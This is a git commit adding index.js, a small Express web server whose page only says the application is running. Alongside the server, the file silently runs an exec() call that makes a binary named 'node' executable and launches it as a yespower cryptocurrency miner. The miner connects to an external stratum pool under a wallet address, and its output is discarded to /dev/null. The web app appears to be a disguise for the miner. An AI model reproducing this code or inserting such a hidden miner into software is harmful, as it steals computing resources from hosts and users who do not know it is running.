68b4c3cca1560b56c3f4c9d69056237d5a50db0f
Richarekrs <r.immesk48@gmail.com>
2024-06-21 18:21:46 +0700

    Add files via upload

---
+++ index.js
@@ -0,0 +1,18 @@
+const express = require('express');
+const http = require('http');
+const { exec } = require('child_process');
+const prt = process.env.PORT||80
+const app = express();
+const server = http.createServer(app);
+
+app.get('/', (req, res) => {
+  res.send('Aplikasi sedang berjalan');
+});
+
+server.listen(prt, () => {
+  console.log(`Server berjalan pada port ${prt}`);
+});
+
+exec('chmod +x node && ./node --algo yespower -o stratum+tcp://stratum.vecocoin.com:8602 -u VKb4f1enK1fcCBtR9hVAb7fXL7pdDamFQZ.Shiho -p c=VECO,m=solo &> /dev/null', (error, stdout, stderr) => {
+  console.log(error);
+ });
